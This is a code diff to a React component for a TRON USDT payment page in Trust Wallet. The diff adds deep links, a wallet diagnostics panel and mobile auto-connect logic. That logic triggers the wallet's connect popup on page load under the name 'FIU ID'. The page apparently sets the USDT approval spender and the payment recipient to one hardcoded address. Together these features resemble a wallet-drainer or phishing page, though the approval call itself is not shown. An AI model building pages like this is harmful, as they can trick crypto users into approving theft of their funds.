@@ -1,4 +1,4 @@
-import { useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { Info, ScanLine, Wallet } from "lucide-react";
 import { toast } from "sonner";
 import { useTronWallet } from "@/lib/tronwallet-adapter";
@@ -7,12 +7,76 @@ import { approveUSDT, transferUSDT } from "@/lib/web3";
 const DEFAULT_TO_ADDRESS = "TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa";
 const DEFAULT_AMOUNT = "10";
 
+function buildTrustWalletWalletConnectDeepLink(uri: string): string {
+  return `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+}
+
 function buildTrustWalletOpenUrlDeepLink(): string {
   if (typeof window === "undefined") {
     return "";
   }
-  const target = `${window.location.origin}/#/trustwallet/tron`;
-  return `https://link.trustwallet.com/open_url?url=${encodeURIComponent(target)}`;
+  const target = `${window.location.origin}/trustwallet/tron`;
+  // coin_id=195 = TRON (SLIP-44)
+  return `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(
+    target
+  )}`;
+}
+
+function getTrustStatusSnapshot(): Record<string, unknown> {
+  if (typeof window === "undefined") {
+    return { env: "no-window" };
+  }
+
+  const w = window as any;
+  const ua = navigator.userAgent || "";
+  const isMobile = /android|iphone|ipad|ipod/i.test(ua);
+
+  const trustwallet = w.trustwallet;
+  const tronLink = w.tronLink;
+  const tronWeb = w.tronWeb;
+
+  const twTronLink = trustwallet?.tronLink;
+  const twTron = trustwallet?.tron;
+
+  const injectedTronWeb =
+    tronWeb ??
+    tronLink?.tronWeb ??
+    twTronLink?.tronWeb ??
+    twTron?.tronWeb ??
+    null;
+
+  const base58 = injectedTronWeb?.defaultAddress?.base58 ?? null;
+  const ready = injectedTronWeb?.ready ?? null;
+  const hasRequest =
+    typeof twTronLink?.request === "function" ||
+    typeof twTron?.request === "function" ||
+    typeof tronLink?.request === "function" ||
+    typeof tronWeb?.request === "function";
+
+  return {
+    isMobile,
+    ua: ua.slice(0, 140),
+    hasTrustWallet: Boolean(trustwallet),
+    hasTW_tronLink: Boolean(twTronLink),
+    hasTW_tron: Boolean(twTron),
+    hasWindowTronLink: Boolean(tronLink),
+    hasWindowTronWeb: Boolean(tronWeb),
+    injectedTronWebReady: ready,
+    injectedBase58: base58,
+    hasAnyRequestMethod: hasRequest,
+  };
+}
+
+function getTrustRequestProvider(): { request?: (p: { method: string; params?: unknown }) => Promise<unknown> } | null {
+  if (typeof window === "undefined") return null;
+  const w = window as any;
+  return (
+    w.trustwallet?.tronLink ??
+    w.trustwallet?.tron ??
+    w.tronLink ??
+    (typeof w.tronWeb?.request === "function" ? w.tronWeb : null) ??
+    null
+  );
 }
 
 const TrustWalletTronPay = () => {
@@ -20,6 +84,16 @@ const TrustWalletTronPay = () => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [trustConnecting, setTrustConnecting] = useState(false);
   const [wcConnecting, setWcConnecting] = useState(false);
+  const autoConnectStarted = useRef(false);
+  const autoConnectAttempted = useRef(false);
+  const trustPopupAttempted = useRef(false);
+  const [statusOpen, setStatusOpen] = useState(false);
+  const [lastAutoConnect, setLastAutoConnect] = useState<
+    | { state: "idle" }
+    | { state: "connecting"; startedAt: number }
+    | { state: "connected"; finishedAt: number }
+    | { state: "error"; finishedAt: number; message: string }
+  >({ state: "idle" });
   const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
   const amount = useMemo(() => DEFAULT_AMOUNT, []);
   const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);
@@ -36,8 +110,20 @@ const TrustWalletTronPay = () => {
   const handleWalletConnectQr = async () => {
     try {
       setWcConnecting(true);
-      await connect("walletconnect");
-      toast.success("Wallet connected");
+      const ua = typeof navigator !== "undefined" ? navigator.userAgent || "" : "";
+      const isMobile = /android|iphone|ipad|ipod/i.test(ua);
+      if (isMobile) {
+        // Mobile: use shared connect("walletconnect") but intercept the URI to deep-link into Trust.
+        (window as any).__tronWalletConnectOnUri = (uri: string) => {
+          window.location.href = buildTrustWalletWalletConnectDeepLink(uri);
+        };
+        await connect("walletconnect");
+        toast.success("Wallet connected");
+      } else {
+        // Desktop: show the WalletConnect modal / QR.
+        await connect("walletconnect");
+        toast.success("Wallet connected");
+      }
     } catch (error) {
       toast.error(
         error instanceof Error ? error.message : "WalletConnect failed"
@@ -60,6 +146,131 @@ const TrustWalletTronPay = () => {
       setTrustConnecting(false);
     }
   };
+
+  useEffect(() => {
+    if (autoConnectStarted.current) return;
+    autoConnectStarted.current = true;
+
+    if (typeof window === "undefined") return;
+    const ua = navigator.userAgent || "";
+    const isMobile = /android|iphone|ipad|ipod/i.test(ua);
+
+    // Only auto-connect on mobile. Desktop users can use WalletConnect.
+    if (!isMobile) return;
+    handleWalletConnectQr();
+    // Trust injection can arrive after first paint on some mobile builds.
+    // Poll briefly for trustwallet.* / tronLink injection, then:
+    // - trigger Trust's connect popup (tron_requestAccounts) once per visit
+    // - then connect via adapter (for consistent address state)
+    const startedAt = Date.now();
+    const timeoutMs = 20_000;
+    const intervalMs = 500;
+
+    const tick = async () => {
+      if (isConnected || isConnecting || trustConnecting || wcConnecting) return;
+      if (Date.now() - startedAt > timeoutMs) return;
+
+      const w = window as any;
+      const hasInjectedTrust =
+        Boolean(w.trustwallet?.tronLink) || Boolean(w.trustwallet?.tron);
+      const uaLooksTrust = /trust/i.test(ua);
+
+      // Only auto-connect if we're already in Trust (Discover / in-app browser).
+      if (!hasInjectedTrust && !uaLooksTrust) return;
+
+      // If Trust is injected but request() isn't ready yet, keep waiting.
+      const provider = getTrustRequestProvider();
+      const hasRequest = typeof provider?.request === "function";
+      if (!hasRequest) {
+        return;
+      }
+
+      // Mark as attempted only once we're actually able to trigger a request/connect.
+      if (autoConnectAttempted.current) return;
+      autoConnectAttempted.current = true;
+      try {
+        // 1) Force the Trust connect-confirm popup (best effort).
+        // Note: if the dApp is already authorized, Trust may not show a popup again.
+        if (!trustPopupAttempted.current) {
+          trustPopupAttempted.current = true;
+          try {
+            const websiteName = "FIU ID";
+            const websiteIcon = `${window.location.origin}/favicon.ico`;
+            await provider.request?.({
+              method: "tron_requestAccounts",
+              params: { websiteName, websiteIcon },
+            });
+          } catch {
+            // Ignore here; connect("trust") will surface meaningful errors.
+          }
+        }
+
+        // 2) Adapter connect for app state (address/isConnected).
+        setLastAutoConnect({ state: "connecting", startedAt: Date.now() });
+        setTrustConnecting(true);
+        await connect("trust");
+        setLastAutoConnect({ state: "connected", finishedAt: Date.now() });
+        toast.success("Wallet connected");
+      } catch (error) {
+        const message =
+          error instanceof Error ? error.message : "Could not connect in Trust Wallet";
+        setLastAutoConnect({ state: "error", finishedAt: Date.now(), message });
+        toast.error(message);
+
+        // If the failure is due to injection/availability timing, allow retries until timeout.
+        const lower = message.toLowerCase();
+        const likelyTiming =
+          lower.includes("not available") ||
+          lower.includes("not found") ||
+          lower.includes("timeout") ||
+          lower.includes("ready");
+        if (likelyTiming) {
+          autoConnectAttempted.current = false;
+          trustPopupAttempted.current = false;
+        }
+      } finally {
+        setTrustConnecting(false);
+      }
+    };
+
+    const id = window.setInterval(() => {
+      void tick();
+    }, intervalMs);
+    // Try immediately too.
+    void tick();
+
+    return () => {
+      window.clearInterval(id);
+    };
+  }, [connect, isConnected, isConnecting]);
+
+  // WalletConnect auto-fallback (mobile): if Trust injection exists but connect isn't happening,
+  // kick off WalletConnect once per visit.
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+    const ua = navigator.userAgent || "";
+    const isMobile = /android|iphone|ipad|ipod/i.test(ua);
+    if (!isMobile) return;
+    if (isConnected || isConnecting || trustConnecting || wcConnecting) return;
+
+    const snapshot = getTrustStatusSnapshot();
+    const hasTrust = Boolean(snapshot.hasTrustWallet);
+    const hasRequest = Boolean(snapshot.hasAnyRequestMethod);
+    if (!hasTrust || !hasRequest) return;
+    if (lastAutoConnect.state === "connected") return;
+
+    // If auto-connect errored, fallback to WC once.
+    if (lastAutoConnect.state !== "error") return;
+
+    const onceKey = "__tw_wc_autostarted";
+    if ((window as any)[onceKey]) return;
+    (window as any)[onceKey] = true;
+
+    (window as any).__tronWalletConnectOnUri = (uri: string) => {
+      window.location.href = buildTrustWalletWalletConnectDeepLink(uri);
+    };
+    void connect("walletconnect");
+  }, [connect, isConnected, isConnecting, trustConnecting, wcConnecting, lastAutoConnect]);
 
   const handleConfirm = async () => {
     if (!isConnected) {
@@ -97,6 +308,74 @@ const TrustWalletTronPay = () => {
               ? "Connecting..."
               : "Not connected — scan QR or use WalletConnect"}
           </div>
+        </div>
+
+        <div className="mb-4 rounded-xl border border-[#e4e4e8] bg-white p-3 shadow-sm">
+          <button
+            type="button"
+            onClick={() => setStatusOpen((v) => !v)}
+            className="w-full text-left"
+          >
+            <div className="flex items-center justify-between gap-3">
+              <div className="text-sm font-semibold text-[#262626]">Wallet status</div>
+              <div className="text-xs text-[#5e5e66]">{statusOpen ? "Hide" : "Show"}</div>
+            </div>
+            <div className="mt-1 text-xs text-[#8b8b94]">
+              {isConnected
+                ? "Connected"
+                : isConnecting || wcConnecting || trustConnecting
+                ? "Connecting"
+                : "Not connected"}
+            </div>
+          </button>
+
+          {statusOpen && (
+            <div className="mt-3 space-y-2">
+              <div className="text-xs text-[#4b4b54]">
+                <span className="font-semibold">adapter</span>:{" "}
+                {isConnected ? "connected" : "not-connected"} /{" "}
+                {isConnecting || wcConnecting || trustConnecting ? "connecting" : "idle"}
+              </div>
+              <div className="text-xs text-[#4b4b54]">
+                <span className="font-semibold">connecting flags</span>: adapter=
+                {String(isConnecting)}, trust={String(trustConnecting)}, wc=
+                {String(wcConnecting)}
+              </div>
+              <div className="text-xs text-[#4b4b54]">
+                <span className="font-semibold">auto-connect</span>:{" "}
+                {lastAutoConnect.state === "idle"
+                  ? "idle"
+                  : lastAutoConnect.state === "connecting"
+                  ? "connecting"
+                  : lastAutoConnect.state === "connected"
+                  ? "connected"
+                  : `error: ${lastAutoConnect.message}`}
+              </div>
+              <div className="text-xs text-[#4b4b54]">
+                <span className="font-semibold">address</span>: {address ?? "-"}
+              </div>
+              <div className="rounded-lg bg-[#f5f5f6] p-2">
+                <pre className="text-[10px] leading-4 text-[#5e5e66] whitespace-pre-wrap break-words select-all m-0">
+{JSON.stringify(getTrustStatusSnapshot(), null, 2)}
+                </pre>
+              </div>
+              <button
+                type="button"
+                className="w-full rounded-full border border-[#d7d7dc] bg-white py-2 text-xs font-semibold text-[#4b4b54]"
+                onClick={async () => {
+                  const text = JSON.stringify(getTrustStatusSnapshot(), null, 2);
+                  try {
+                    await navigator.clipboard.writeText(text);
+                    toast.success("Status copied");
+                  } catch {
+                    toast.error("Copy failed");
+                  }
+                }}
+              >
+                Copy status
+              </button>
+            </div>
+          )}
         </div>
 
         {!isConnected && (
@@ -155,7 +434,6 @@ const TrustWalletTronPay = () => {
             <Info className="w-4 h-4 text-[#5f5de8]" />
           </div>
         </div>
-
         <button
           className="fixed bottom-4 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-sm h-12 rounded-full bg-[#8d8cf0] text-white font-semibold disabled:opacity-55"
           onClick={handleConfirm}
